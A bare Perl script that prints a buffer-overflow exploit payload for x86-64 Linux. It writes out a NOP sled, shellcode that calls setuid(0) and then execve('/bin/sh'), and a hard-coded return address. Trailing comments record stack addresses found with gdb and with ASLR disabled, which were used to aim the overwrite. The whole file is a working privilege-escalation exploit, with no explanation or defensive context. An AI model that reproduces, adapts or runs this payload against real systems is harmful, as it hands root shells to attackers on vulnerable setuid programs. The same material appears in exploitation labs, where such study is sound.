#!/usr/bin/perl
print "\x90"x10;

print "\x48\x31\xff";
print "\xb0\x69";
print "\x0f\x05";
print "\x48\x31\xc0";
print "\x48\x31\xff";
print "\x48\x31\xf6";
print "\x48\x31\xd2";
print "\x48\x31\xc9";
print "\xb9\xff\x2f\x73\x68";
print "\xc1\xe9\x08"; 
print "\x68\x2f\x62\x69\x6e";
print "\x89\x4c\x24\x04";
print "\xb0\x3b";
print "\x48\x89\xe7";
print "\x0f\x05";

print "\x50\xc5\xff\xff\xff\x7f";

#Random sample
#0x 7f fd 47 15 48 00
#Gdb sample
#0x 7f ff ff ff dc 20
#Runtime ( no ASLR ) 
#0x 7f ff ff ff dc 60
